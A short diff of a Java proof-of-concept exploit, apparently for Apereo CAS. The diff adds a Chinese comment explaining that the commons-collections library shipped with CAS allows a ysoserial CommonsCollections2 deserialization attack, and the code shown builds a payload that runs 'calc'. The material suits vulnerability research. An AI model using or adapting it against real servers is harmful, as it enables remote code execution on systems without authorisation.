@@ -23,6 +23,7 @@ import java.util.List;
 
 public class PoC{
     public static void main(String[] args) throws Exception{
+        // 由于CAS的WEB-INF/lib下刚好有commons-collections包，所以可以使用ysoserial的CommonsCollections2这个gadget进行反序列化攻击
         String poc[] = {"CommonsCollections2", "calc"};
         final Object payloadObject = ObjectPayload.Utils.makePayloadObject(poc[0], poc[1]);
 
